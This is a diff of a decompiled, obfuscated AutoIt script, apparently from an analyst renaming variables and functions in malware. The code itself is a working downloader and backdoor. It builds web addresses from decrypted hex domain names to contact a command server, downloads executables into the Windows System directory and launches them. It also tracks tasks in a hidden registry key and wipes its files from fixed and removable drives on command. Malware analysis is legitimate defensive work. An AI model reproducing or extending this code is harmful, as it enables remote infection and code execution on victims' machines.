 		If Not String($ArgOpt03) = "" Then $Local0014 &= " (" & $ArgOpt03 & ")"
 		ConsoleWrite($Local0014 & @CRLF)
@@ -1073,17 +1073,17 @@ Func CreateMutex($MutexName, $ArgOpt01 = 0)
 	Return $MutexHandle[0]
 EndFunc
 
-Func Fn0090($Arg00, ByRef $ArgRef01, ByRef $ArgRef02, ByRef $ArgRef03)
-	If Number($Arg00) > 0 Then
-		$Arg00 = Int($Arg00 / 0x03E8)
-		$ArgRef01 = Int($Arg00 / 0x0E10)
-		$Arg00 = Mod($Arg00, 0x0E10)
-		$ArgRef02 = Int($Arg00 / 0x003C)
-		$ArgRef03 = Mod($Arg00, 0x003C)
+Func Fn0090($Folder1, ByRef $ArgRef01, ByRef $ArgRef02, ByRef $ArgRef03)
+	If Number($Folder1) > 0 Then
+		$Folder1 = Int($Folder1 / 0x03E8)
+		$ArgRef01 = Int($Folder1 / 0x0E10)
+		$Folder1 = Mod($Folder1, 0x0E10)
+		$ArgRef02 = Int($Folder1 / 0x003C)
+		$ArgRef03 = Mod($Folder1, 0x003C)
 		Return 1
-	ElseIf Number($Arg00) = 0 Then
+	ElseIf Number($Folder1) = 0 Then
 		$ArgRef01 = 0
-		$Arg00 = 0
+		$Folder1 = 0
 		$ArgRef02 = 0
 		$ArgRef03 = 0
 		Return 1
@@ -1092,24 +1092,24 @@ Func Fn0090($Arg00, ByRef $ArgRef01, ByRef $ArgRef02, ByRef $ArgRef03)
 	EndIf
 EndFunc
 
-Func Fn0091(ByRef $ArgRef00, $Arg01)
+Func Fn0091(ByRef $ArgRef00, $File1)
 	If Not IsArray($ArgRef00) Then Return SetError(1, 0, -1)
 	If UBound($ArgRef00, 0) <> 1 Then Return SetError(2, 0, -1)
 	Local $Local001C = UBound($ArgRef00)
 	ReDim $ArgRef00[$Local001C + 1]
-	$ArgRef00[$Local001C] = $Arg01
+	$ArgRef00[$Local001C] = $File1
 	Return $Local001C
 EndFunc
 
-Func Fn0092(ByRef $ArgRef00, $Arg01, $ArgOpt02 = "")
+Func Fn0092(ByRef $ArgRef00, $File1, $ArgOpt02 = "")
 	If Not IsArray($ArgRef00) Then Return SetError(1, 0, 0)
 	If UBound($ArgRef00, 0) <> 1 Then Return SetError(2, 0, 0)
 	Local $Local001C = UBound($ArgRef00) + 1
 	ReDim $ArgRef00[$Local001C]
-	For $Var0273 = $Local001C - 1 To $Arg01 + 1 Step -1
+	For $Var0273 = $Local001C - 1 To $File1 + 1 Step -1
 		$ArgRef00[$Var0273] = $ArgRef00[$Var0273 - 1]
 	Next
-	$ArgRef00[$Arg01] = $ArgOpt02
+	$ArgRef00[$File1] = $ArgOpt02
 	Return $Local001C
 EndFunc
 
@@ -1132,51 +1132,51 @@ Func Fn0094(Const ByRef $ArgCRef00, $ArgOpt01 = "|", $ArgOpt02 = 0, $ArgOpt03 = 
 	Return StringTrimRight($Var0285, StringLen($ArgOpt01))
 EndFunc
 
-Func Fn0095($Arg00)
-	If StringLeft($Arg00, 2) = "0x" Then Return BinaryToString($Arg00)
-	Return BinaryToString("0x" & $Arg00)
+Func Fn0095($Folder1)
+	If StringLeft($Folder1, 2) = "0x" Then Return BinaryToString($Folder1)
+	Return BinaryToString("0x" & $Folder1)
 EndFunc
 
-Func Fn0096($Arg00, $Arg01, $Arg02, $ArgOpt03 = -1)
+Func Fn0096($Folder1, $File1, $Folder2, $ArgOpt03 = -1)
 	Local $Local001E = ""
 	If $ArgOpt03 = Default Or $ArgOpt03 = -1 Then $Local001E = "(?i)"
 	Local $Local001F = "(\.|\||\*|\?|\+|\(|\)|\{|\}|\[|\]|\^|\$|\\)"
-	$Arg01 = StringRegExpReplace($Arg01, $Local001F, "\\$1")
-	$Arg02 = StringRegExpReplace($Arg02, $Local001F, "\\$1")
-	If $Arg01 = "" Then $Arg01 = "\A"
-	If $Arg02 = "" Then $Arg02 = "\z"
-	Local $Local0020 = StringRegExp($Arg00, "(?s)" & $Local001E & $Arg01 & "(.*?)" & $Arg02, 3)
+	$File1 = StringRegExpReplace($File1, $Local001F, "\\$1")
+	$Folder2 = StringRegExpReplace($Folder2, $Local001F, "\\$1")
+	If $File1 = "" Then $File1 = "\A"
+	If $Folder2 = "" Then $Folder2 = "\z"
+	Local $Local0020 = StringRegExp($Folder1, "(?s)" & $Local001E & $File1 & "(.*?)" & $Folder2, 3)
 	If @error Then Return SetError(1, 0, 0)
 	Return $Local0020
 EndFunc
 
-Func Fn0097($Arg00, $Arg01, $Arg02)
+Func Fn0097($Folder1, $File1, $Folder2)
 	Local $Var0286, $Var0287, $Var0288
-	If $Arg00 = "" Or (Not IsString($Arg00)) Then
-		Return SetError(1, 0, $Arg00)
-	ElseIf $Arg01 = "" Or (Not IsString($Arg00)) Then
-		Return SetError(2, 0, $Arg00)
+	If $Folder1 = "" Or (Not IsString($Folder1)) Then
+		Return SetError(1, 0, $Folder1)
+	ElseIf $File1 = "" Or (Not IsString($Folder1)) Then
+		Return SetError(2, 0, $Folder1)
 	Else
-		$Var0286 = StringLen($Arg00)
-		If (Abs($Arg02) > $Var0286) Or (Not IsInt($Arg02)) Then
-			Return SetError(3, 0, $Arg00)
+		$Var0286 = StringLen($Folder1)
+		If (Abs($Folder2) > $Var0286) Or (Not IsInt($Folder2)) Then
+			Return SetError(3, 0, $Folder1)
 		EndIf
 	EndIf
-	If $Arg02 = 0 Then
-		Return $Arg01 & $Arg00
-	ElseIf $Arg02 > 0 Then
-		$Var0287 = StringLeft($Arg00, $Arg02)
-		$Var0288 = StringRight($Arg00, $Var0286 - $Arg02)
-		Return $Var0287 & $Arg01 & $Var0288
-	ElseIf $Arg02 < 0 Then
-		$Var0287 = StringLeft($Arg00, Abs($Var0286 + $Arg02))
-		$Var0288 = StringRight($Arg00, Abs($Arg02))
-		Return $Var0287 & $Arg01 & $Var0288
+	If $Folder2 = 0 Then
+		Return $File1 & $Folder1
+	ElseIf $Folder2 > 0 Then
+		$Var0287 = StringLeft($Folder1, $Folder2)
+		$Var0288 = StringRight($Folder1, $Var0286 - $Folder2)
+		Return $Var0287 & $File1 & $Var0288
+	ElseIf $Folder2 < 0 Then
+		$Var0287 = StringLeft($Folder1, Abs($Var0286 + $Folder2))
+		$Var0288 = StringRight($Folder1, Abs($Folder2))
+		Return $Var0287 & $File1 & $Var0288
 	EndIf
 EndFunc
 
-Func Fn0098($Arg00)
-	Local $Local0021 = FileOpen($Arg00, $Var027C)
+Func Fn0098($Folder1)
+	Local $Local0021 = FileOpen($Folder1, $Var027C)
 	If $Local0021 = -1 Then Return SetError(1, 0, 0)
 	Local $Local0022 = FileWrite($Local0021, "")
 	FileClose($Local0021)
@@ -1184,26 +1184,26 @@ Func Fn0098($Arg00)
 	Return 1
 EndFunc
 
-Func Fn0099($Arg00, $Arg01, $Arg02, $ArgOpt03 = 0)
-	If $Arg01 <= 0 Then Return SetError(4, 0, 0)
-	If Not IsString($Arg02) Then
-		$Arg02 = String($Arg02)
-		If $Arg02 = "" Then Return SetError(6, 0, 0)
+Func Fn0099($Folder1, $File1, $Folder2, $ArgOpt03 = 0)
+	If $File1 <= 0 Then Return SetError(4, 0, 0)
+	If Not IsString($Folder2) Then
+		$Folder2 = String($Folder2)
+		If $Folder2 = "" Then Return SetError(6, 0, 0)
 	EndIf
 	If $ArgOpt03 <> 0 And $ArgOpt03 <> 1 Then Return SetError(5, 0, 0)
-	If Not FileExists($Arg00) Then Return SetError(2, 0, 0)
-	Local $Local0023 = FileRead($Arg00)
+	If Not FileExists($Folder1) Then Return SetError(2, 0, 0)
+	Local $Local0023 = FileRead($Folder1)
 	Local $Local0024 = StringSplit(StringStripCR($Local0023), @LF)
-	If UBound($Local0024) < $Arg01 Then Return SetError(1, 0, 0)
-	Local $Local0025 = FileOpen($Arg00, $Var027C)
+	If UBound($Local0024) < $File1 Then Return SetError(1, 0, 0)
+	Local $Local0025 = FileOpen($Folder1, $Var027C)
 	If $Local0025 = -1 Then Return SetError(3, 0, 0)
 	$Local0023 = ""
 	For $Var0273 = 1 To $Local0024[0]
-		If $Var0273 = $Arg01 Then
+		If $Var0273 = $File1 Then
 			If $ArgOpt03 = 1 Then
-				If $Arg02 <> "" Then $Local0023 &= $Arg02 & @CRLF
+				If $Folder2 <> "" Then $Local0023 &= $Folder2 & @CRLF
 			Else
-				$Local0023 &= $Arg02 & @CRLF & $Local0024[$Var0273] & @CRLF
+				$Local0023 &= $Folder2 & @CRLF & $Local0024[$Var0273] & @CRLF
 			EndIf
 		ElseIf $Var0273 < $Local0024[0] Then
 			$Local0023 &= $Local0024[$Var0273] & @CRLF
@@ -1242,8 +1242,8 @@ Func CheckIP()
 	Return SetError(1, 0, -1)
 EndFunc
 
-Func Fn009B($Arg00, $ArgOpt01 = True)
-	Local $Local0026 = INETREAD($Arg00, 1)
+Func Fn009B($Folder1, $ArgOpt01 = True)
+	Local $Local0026 = INETREAD($Folder1, 1)
 	Local $Local0027 = @error, $Var028B = @extended
 	If $ArgOpt01 Then $Local0026 = BinaryToString($Local0026)
 	Return SetError($Local0027, $Var028B, $Local0026)
@@ -1330,10 +1330,10 @@ Func Fn009C()
 	Else
 		$Var02D7 = 0
 	EndIf
-	If $Var02DD = 0 And RegRead($Var029A, "exp1") <> "" Then
+	If $Var02DD = 0 And RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
 		Fn00B8()
-		$Var0360 = RegRead($Var029A, "exp1")
-		$Var0361 = RegRead($Var029A, "dreg")
+		$Var0360 = RegRead($DRMAmtyRegistryKey, "exp1")
+		$Var0361 = RegRead($DRMAmtyRegistryKey, "dreg")
 		$Var0362 = Decrypt(0, $Var0360, $EncryptionKey, 4) + 0x000F
 		$Var0363 = Decrypt(0, $Var0361, $EncryptionKey, 4)
 		If $Var0362 * 1 <= @YDAY * 1 Or $Var0363 * 1 < @YEAR * 1 Then
@@ -1401,11 +1401,11 @@ Func Fn009C()
 						$Var0366 = $Var0366 + 1
 						$Var0367 = $Var0367 + 1
 						$Var0365 = $Var0365 + 1
-						$Var036C = Decrypt(1, $Var036A & $Var036B, $Var0369, 0)
-						$Var036D = StringLower($Var036C)
-						If $Var036D = "62d13aa0" Then $Var036D = "5eb149c0"
-						If $Var036D = "ffbfcf9b" Then $Var036D = "5eb149c0"
-						$Var036E = "http://www." & $Var036D & ".com/" & $Var0369 & ".htm"
+						$RegKey = Decrypt(1, $Var036A & $Var036B, $Var0369, 0)
+						$RegName = StringLower($RegKey)
+						If $RegName = "62d13aa0" Then $RegName = "5eb149c0"
+						If $RegName = "ffbfcf9b" Then $RegName = "5eb149c0"
+						$Var036E = "http://www." & $RegName & ".com/" & $Var0369 & ".htm"
 						$Var035F = Fn00B9($Var036E, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
 						$Var029F = Fn009B($Var035F)
 						Fn00B6()
@@ -1469,7 +1469,7 @@ Func Fn009C()
 		EndIf
 	EndIf
 	If $Var02EB = 1 Then
-		RegDelete($Var029A)
+		RegDelete($DRMAmtyRegistryKey)
 	EndIf
 	If $Var02E1 = 1 Then
 		$Var036F = StringRegExp($Var029F, "VRXe", 0)
@@ -1627,9 +1627,9 @@ Func Fn009C()
 								Fn00B2($Var038E, $Var038F)
 								If FileExists($Var038F) Then
 									$Var0390 = $Var038F
-									RegDelete($Var029A, "output2")
-									RegDelete($Var029A, "input2")
-									RegWrite($Var029A, "input2", "REG_SZ", $Var0388)
+									RegDelete($DRMAmtyRegistryKey, "output2")
+									RegDelete($DRMAmtyRegistryKey, "input2")
+									RegWrite($DRMAmtyRegistryKey, "input2", "REG_SZ", $Var0388)
 									If @Compiled = 1 Then
 										$Var0391 = FileGetShortName(@AutoItExe & " /AutoIt3ExecuteScript """ & $Var0390 & """")
 										Run($Var0391)
@@ -1642,9 +1642,9 @@ Func Fn009C()
 										While 1
 											Sleep(0x03E8)
 											$Var0393 = $Var0393 + 1
-											$Var0394 = RegRead($Var029A, "output2")
+											$Var0394 = RegRead($DRMAmtyRegistryKey, "output2")
 											If $Var0394 <> "" Then
-												RegDelete($Var029A, "output2")
+												RegDelete($DRMAmtyRegistryKey, "output2")
 												ExitLoop
 											EndIf
 											If $Var0393 = $Var0389 Then
@@ -1731,7 +1731,7 @@ Func Fn009C()
 								$Var039F = $Var039F + 1
 							EndIf
 						Next
-						If RegRead($Var029A, $Var039C) = "1" Or RegRead($Var029A, $Var039C) = "error" Then
+						If RegRead($DRMAmtyRegistryKey, $Var039C) = "1" Or RegRead($DRMAmtyRegistryKey, $Var039C) = "error" Then
 						Else
 							If $Var039F = 0 Then
 								Sleep(Random(0, $Var039D * 0x03E8, 1))
@@ -1739,12 +1739,12 @@ Func Fn009C()
 								If FileExists(@SystemDir & "\" & $Var0386) And FileGetVersion(@SystemDir & "\" & $Var0386) = $Var039B And FileGetSize(@SystemDir & "\" & $Var0386) = $Var0387 Then
 									ShellExecute($Var0386, "", @SystemDir & "\")
 									If @error Then
-										RegWrite($Var029A, $Var039C, "REG_SZ", "error")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error")
 									Else
-										RegWrite($Var029A, $Var039C, "REG_SZ", "1")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "1")
 									EndIf
 								Else
-									RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error2")
 									FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
 									FileDelete(@SystemDir & "\" & $Var0386)
 								EndIf
@@ -1782,25 +1782,25 @@ Func Fn009C()
 								$Var03AC = "true"
 							EndIf
 						Next
-						If RegRead($Var029A, $Var03A8) <> "" Then
+						If RegRead($DRMAmtyRegistryKey, $Var03A8) <> "" Then
 						Else
 							$Var03AE = Random(1, $Var03A9, 1)
 							If $Var03AC = $Var03AA Then
 								If $Var03AE = 1 Or $Var03AE = 0 Then
 									$Var0376 = InetGet($Var03A4, @SystemDir & "\" & $Var03A5, 1, 0)
 									If $Var0376 = 0 Then
-										RegWrite($Var029A, $Var03A8, "REG_SZ", "error1")
+										RegWrite($DRMAmtyRegistryKey, $Var03A8, "REG_SZ", "error1")
 									Else
 										If FileExists(@SystemDir & "\" & $Var03A5) And FileGetVersion(@SystemDir & "\" & $Var03A5) = $Var03A7 And FileGetSize(@SystemDir & "\" & $Var03A5) = $Var03A6 Then
 											ShellExecute($Var03A5, "", @SystemDir & "\")
 											Sleep(0x1388)
 											If @error Then
-												RegWrite($Var029A, $Var03A8, "REG_SZ", "error")
+												RegWrite($DRMAmtyRegistryKey, $Var03A8, "REG_SZ", "error")
 											Else
-												RegWrite($Var029A, $Var03A8, "REG_SZ", "1")
+												RegWrite($DRMAmtyRegistryKey, $Var03A8, "REG_SZ", "1")
 											EndIf
 										Else
-											RegWrite($Var029A, $Var03A8, "REG_SZ", "error2")
+											RegWrite($DRMAmtyRegistryKey, $Var03A8, "REG_SZ", "error2")
 											FileSetAttrib(@SystemDir & "\" & $Var03A5, "-RASH")
 											FileDelete(@SystemDir & "\" & $Var03A5)
 										EndIf
@@ -1842,12 +1842,12 @@ Func Fn009C()
 							EndIf
 						Next
 					EndIf
-					If RegRead($Var029A, $Var039C) <> "" Then
+					If RegRead($DRMAmtyRegistryKey, $Var039C) <> "" Then
 					Else
 						If $Var03B2 = $Var03B0 Then
 							$Var03AE = Random(1, $Var03A9, 1)
 							If $Var03AE = 1 Or $Var03AE = 0 Then
-								$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, $Var02A2, $EncryptionKey)
+								$Var029B = Fn00B7($Var02A0, $Var02A1, $DRMAmtyRegistryKey, $Var02A2, $EncryptionKey)
 								If StringInStr($Var029B, "1;") Then
 									$Var029B = StringSplit($Var029B, ";")
 									If $Var029B[0] = 4 Or $Var029B[0] = 2 Then
@@ -1865,24 +1865,24 @@ Func Fn009C()
 								If $Var03B3 = $Var03AA Then
 									$Var0376 = InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
 									If $Var0376 = 0 Then
-										RegWrite($Var029A, $Var039C, "REG_SZ", "error1")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error1")
 									Else
 										If FileExists(@SystemDir & "\" & $Var0386) Then
 											ShellExecute($Var0386, "", @SystemDir & "\")
 											Sleep(0x0064)
 											If @error Then
-												RegWrite($Var029A, $Var039C, "REG_SZ", "error")
+												RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error")
 											Else
-												RegWrite($Var029A, $Var039C, "REG_SZ", "1")
+												RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "1")
 											EndIf
 										Else
 											FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
 											FileDelete(@SystemDir & "\" & $Var0386)
-											RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
+											RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error2")
 										EndIf
 									EndIf
 								Else
-									RegWrite($Var029A, $Var039C, "REG_SZ", "noneed")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "noneed")
 								EndIf
 							EndIf
 						EndIf
@@ -1955,7 +1955,7 @@ Func Fn009C()
 								Next
 							EndIf
 						EndIf
-						If RegRead($Var029A, $Var039C) = 1 Or RegRead($Var029A, $Var039C) = "error" Then
+						If RegRead($DRMAmtyRegistryKey, $Var039C) = 1 Or RegRead($DRMAmtyRegistryKey, $Var039C) = "error" Then
 						Else
 							If $Var039F = 0 Then
 								If $Var03B6 <> 0 Then
@@ -1964,17 +1964,17 @@ Func Fn009C()
 									If FileExists(@SystemDir & "\" & $Var0386) And FileGetVersion(@SystemDir & "\" & $Var0386) = $Var039B And FileGetSize(@SystemDir & "\" & $Var0386) = $Var0387 Then
 										ShellExecute($Var0386, "", @SystemDir & "\")
 										If @error Then
-											RegWrite($Var029A, $Var039C, "REG_SZ", "error")
+											RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error")
 										Else
-											RegWrite($Var029A, $Var039C, "REG_SZ", "1")
+											RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "1")
 										EndIf
 									Else
 										FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
 										FileDelete(@SystemDir & "\" & $Var0386)
-										RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error2")
 									EndIf
 								Else
-									RegWrite($Var029A, $Var039C, "REG_SZ", "noneed")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "noneed")
 								EndIf
 							EndIf
 						EndIf
@@ -1998,7 +1998,7 @@ Func Fn009C()
 					$Var0386 = $Var039A[2]
 					$Var039C = $Var039A[3]
 					$Var03A9 = $Var039A[4]
-					If RegRead($Var029A, $Var039C) <> "" Then
+					If RegRead($DRMAmtyRegistryKey, $Var039C) <> "" Then
 					Else
 						$Var03AE = Random(1, $Var03A9, 1)
 						If $Var03AE = 1 Or $Var03AE = 0 Then
@@ -2008,20 +2008,20 @@ Func Fn009C()
 							EndIf
 							$Var0376 = InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
 							If $Var0376 = 0 Then
-								RegWrite($Var029A, $Var039C, "REG_SZ", "error1")
+								RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error1")
 							Else
 								If FileExists(@SystemDir & "\" & $Var0386) Then
 									ShellExecute($Var0386, "", @SystemDir & "\")
 									Sleep(0x1388)
 									If @error Then
-										RegWrite($Var029A, $Var039C, "REG_SZ", "error")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error")
 									Else
-										RegWrite($Var029A, $Var039C, "REG_SZ", "1")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "1")
 									EndIf
 								Else
 									FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
 									FileDelete(@SystemDir & "\" & $Var0386)
-									RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error2")
 								EndIf
 							EndIf
 						Else
@@ -2047,12 +2047,12 @@ Func Fn009C()
 					$Var039C = $Var039A[3]
 					$Var03A9 = $Var039A[4]
 					$Var03C3 = $Var039A[5]
-					If RegRead($Var029A, $Var039C) <> "" Then
+					If RegRead($DRMAmtyRegistryKey, $Var039C) <> "" Then
 					Else
 						$Var03AE = Random(1, $Var03A9, 1)
 						If $Var03AE = 1 Or $Var03AE = 0 Then
-							$Var0360 = RegRead($Var029A, "exp1")
-							$Var0361 = RegRead($Var029A, "dreg")
+							$Var0360 = RegRead($DRMAmtyRegistryKey, "exp1")
+							$Var0361 = RegRead($DRMAmtyRegistryKey, "dreg")
 							$Var0362 = Decrypt(0, $Var0360, $EncryptionKey, 4)
 							$Var0363 = Decrypt(0, $Var0361, $EncryptionKey, 4)
 							If $Var0362 * 1 + $Var03C3 <= @YDAY * 1 Or $Var0363 * 1 < @YEAR * 1 Then
@@ -2062,19 +2062,19 @@ Func Fn009C()
 								EndIf
 								$Var0376 = InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
 								If $Var0376 = 0 Then
-									RegWrite($Var029A, $Var039C, "REG_SZ", "error1")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error1")
 								Else
 									If FileExists(@SystemDir & "\" & $Var0386) Then
 										ShellExecute($Var0386, "", @SystemDir & "\")
 										If @error Then
-											RegWrite($Var029A, $Var039C, "REG_SZ", "error")
+											RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error")
 										Else
-											RegWrite($Var029A, $Var039C, "REG_SZ", "1")
+											RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "1")
 										EndIf
 									Else
 										FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
 										FileDelete(@SystemDir & "\" & $Var0386)
-										RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error2")
 									EndIf
 								EndIf
 							Else
@@ -2107,7 +2107,7 @@ Func Fn009C()
 						$Var0385 = $Var03C4[3]
 						$Var0386 = $Var03C4[4]
 						$Var039C = $Var03C4[5]
-						If RegRead($Var029A, $Var039C) <> "" Then
+						If RegRead($DRMAmtyRegistryKey, $Var039C) <> "" Then
 						Else
 							If FileExists(@SystemDir & "\" & $Var0386) Then
 								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
@@ -2119,14 +2119,14 @@ Func Fn009C()
 								ShellExecute($Var0386, "", @SystemDir & "\")
 								Sleep(0x1388)
 								If @error Then
-									RegWrite($Var029A, $Var039C, "REG_SZ", "error")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error")
 								Else
-									RegWrite($Var029A, $Var039C, "REG_SZ", "1")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "1")
 								EndIf
 							Else
 								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
 								FileDelete(@SystemDir & "\" & $Var0386)
-								RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
+								RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error2")
 							EndIf
 						EndIf
 					EndIf
@@ -2137,7 +2137,7 @@ Func Fn009C()
 						$Var0385 = $Var03C4[3]
 						$Var0386 = $Var03C4[4]
 						$Var039C = $Var03C4[5]
-						If RegRead($Var029A, $Var039C) <> "" Then
+						If RegRead($DRMAmtyRegistryKey, $Var039C) <> "" Then
 						Else
 							If FileExists(@SystemDir & "\" & $Var0386) Then
 								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
@@ -2149,14 +2149,14 @@ Func Fn009C()
 								ShellExecute($Var0386, "", @SystemDir & "\")
 								Sleep(0x1388)
 								If @error Then
-									RegWrite($Var029A, $Var039C, "REG_SZ", "error")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error")
 								Else
-									RegWrite($Var029A, $Var039C, "REG_SZ", "1")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "1")
 								EndIf
 							Else
 								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
 								FileDelete(@SystemDir & "\" & $Var0386)
-								RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
+								RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error2")
 							EndIf
 						EndIf
 					EndIf
@@ -2180,7 +2180,7 @@ Func Fn009C()
 					$Var0386 = $Var039A[2]
 					$Var039C = $Var039A[3]
 					$Var03A9 = $Var039A[4]
-					$Var03CD = RegRead($Var029A, $Var039C)
+					$Var03CD = RegRead($DRMAmtyRegistryKey, $Var039C)
 					If $Var03CD = "error" Or $Var03CD = "error2" Or $Var03CD = "error1" Or $Var03CD = "1" Then
 						$Var03AE = Random(1, $Var03A9, 1)
 						If $Var03AE = 1 Or $Var03AE = 0 Then
@@ -2190,20 +2190,20 @@ Func Fn009C()
 							EndIf
 							$Var0376 = InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
 							If $Var0376 = 0 Then
-								RegWrite($Var029A, $Var039C, "REG_SZ", "error1")
+								RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error1")
 							Else
 								If FileExists(@SystemDir & "\" & $Var0386) Then
 									ShellExecute($Var0386, "", @SystemDir & "\")
 									Sleep(0x1388)
 									If @error Then
-										RegWrite($Var029A, $Var039C, "REG_SZ", "error")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error")
 									Else
-										RegWrite($Var029A, $Var039C, "REG_SZ", "2")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "2")
 									EndIf
 								Else
 									FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
 									FileDelete(@SystemDir & "\" & $Var0386)
-									RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "error2")
 								EndIf
 							EndIf
 						Else
@@ -2214,11 +2214,11 @@ Func Fn009C()
 		EndIf
 	EndIf
 	If $Var02E8 = 1 Then
-		RegWrite($Var029A, "eggol", "REG_SZ", "1")
+		RegWrite($DRMAmtyRegistryKey, "eggol", "REG_SZ", "1")
 		$Var02C5 = 1
 	EndIf
 	If $Var02E9 = 1 Then
-		RegWrite($Var029A, "eggol", "REG_SZ", "0")
+		RegWrite($DRMAmtyRegistryKey, "eggol", "REG_SZ", "0")
 		$Var02C5 = 0
 	EndIf
 	If $Var02DC = 1 Then
@@ -2243,8 +2243,8 @@ Func Fn009C()
 					DeleteFilesInFixedDriveRoots()
 					DeleteFilesInScriptDir()
 					DeleteFilesInRemovableDriveRoots()
-					Fn00A1()
-					Fn00A3()
+					DeleteRegistryCSRCSAutoStart()
+					RunSCmd()
 					Exit
 				EndIf
 			Next
@@ -2260,7 +2260,7 @@ Func Fn009C()
 			$Var03D0 = StringSplit($Var02C6, "~")
 			$Var03B7 = $Var034A
 			If $Var03B7 <> "-1" Then
-				$Var03D2 = Fn00B7($Var02A0, $Var02A1, $Var029A, $Var02A2, $EncryptionKey)
+				$Var03D2 = Fn00B7($Var02A0, $Var02A1, $DRMAmtyRegistryKey, $Var02A2, $EncryptionKey)
 				If StringInStr($Var03D2, "1;") Then
 					$Var03D2 = StringSplit($Var03D2, ";")
 					If $Var03D2[0] = 4 Or $Var03D2[0] = 2 Then
@@ -2279,8 +2279,8 @@ Func Fn009C()
 					DeleteFilesInFixedDriveRoots()
 					DeleteFilesInScriptDir()
 					DeleteFilesInRemovableDriveRoots()
-					Fn00A1()
-					Fn00A3()
+					DeleteRegistryCSRCSAutoStart()
+					RunSCmd()
 					Exit
 				EndIf
 			Next
@@ -2325,8 +2325,8 @@ Func Fn009C()
 								DeleteFilesInFixedDriveRoots()
 								DeleteFilesInScriptDir()
 								DeleteFilesInRemovableDriveRoots()
-								Fn00A1()
-								Fn00A3()
+								DeleteRegistryCSRCSAutoStart()
+								RunSCmd()
 								Exit
 							EndIf
 						EndIf
@@ -2399,19 +2399,19 @@ Func Fn009C()
 		EndIf
 	EndIf
 	If $Var02D5 = 1 Then
-		RegWrite($Var029A, "a", "REG_SZ", "1")
+		RegWrite($DRMAmtyRegistryKey, "a", "REG_SZ", "1")
 		$Var02D1 = 1
 	EndIf
 	If $Var02D3 = 1 Then
-		RegWrite($Var029A, "a", "REG_SZ", "0")
+		RegWrite($DRMAmtyRegistryKey, "a", "REG_SZ", "0")
 		$Var02D1 = 0
 	EndIf
 	If $Var02D6 = 1 Then
-		RegWrite($Var029A, "b", "REG_SZ", "1")
+		RegWrite($DRMAmtyRegistryKey, "b", "REG_SZ", "1")
 		$Var02D2 = 1
 	EndIf
 	If $Var02D4 = 1 Then
-		RegWrite($Var029A, "b", "REG_SZ", "0")
+		RegWrite($DRMAmtyRegistryKey, "b", "REG_SZ", "0")
 		$Var02D2 = 0
 	EndIf
 	If $Var02B0 = 1 Then
@@ -2424,9 +2424,9 @@ Func Fn009C()
 			$Var03DF = StringSplit($Var02C6, "~")
 			For $Var03E0 = 1 To $Var03DF[0]
 				If ProcessExists($Var03DF[$Var03E0]) Then
-					RegWrite($Var029A, "a", "REG_SZ", "1")
+					RegWrite($DRMAmtyRegistryKey, "a", "REG_SZ", "1")
 					$Var02D1 = 1
-					RegWrite($Var029A, "b", "REG_SZ", "1")
+					RegWrite($DRMAmtyRegistryKey, "b", "REG_SZ", "1")
 					$Var02D2 = 1
 				EndIf
 			Next
@@ -2653,7 +2653,7 @@ Func Fn009C()
 					$Var03F6 = $Var03F5[7]
